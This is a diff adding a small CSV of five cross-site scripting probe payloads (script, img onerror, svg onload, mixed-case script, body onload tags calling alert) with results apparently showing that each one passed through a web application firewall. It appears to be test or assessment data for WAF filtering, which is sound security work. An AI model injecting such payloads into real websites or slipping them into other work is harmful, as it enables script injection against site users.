@@ -1,0 +1,6 @@
+payload,view_code_via_WAF,payload_served_through_WAF
+<script>alert('X1cross')</script>,200,1
+<img src=x onerror=alert('X2cross')>,200,1
+<svg onload=alert('X3cross')>,200,1
+<ScRiPt>alert('X4cross')</ScRiPt>,200,1
+<body onload=alert('X5cross')>,200,1
